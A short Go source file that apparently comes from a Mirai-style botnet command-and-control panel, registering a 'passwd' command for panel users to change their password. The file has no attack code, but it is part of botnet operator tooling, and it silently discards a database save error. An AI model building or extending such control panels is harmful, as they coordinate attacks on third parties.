package user

import (
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"passwd", "changepass", "passchange"},
		Description: "Changes the password.",
		Admin:       false,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			var tries = 0
			pass, err := session.Reader.MiraiRead("New Password: ", false)
			if err != nil {
				return err
			}

			for tries <= 3 {
				repeat, err := session.MiraiRead("Repeat Password: ", false)
				if err != nil {
					return err
				}

				if pass == repeat {
					session.Password = pass
					err := database.SetUser(session.UserProfile)
					if err != nil {
						return nil
					}
					session.Println("Password successfully changed.")
					return nil
				}

				if 3-tries == 1 {
					session.Println(fmt.Sprintf("Repeated password is not the same. There is %d try left.", 3-tries))
				} else {
					session.Println(fmt.Sprintf("Repeated password is not the same. There are %d tries left.", 3-tries))
				}
				tries++
			}

			return nil
		},
	})
}
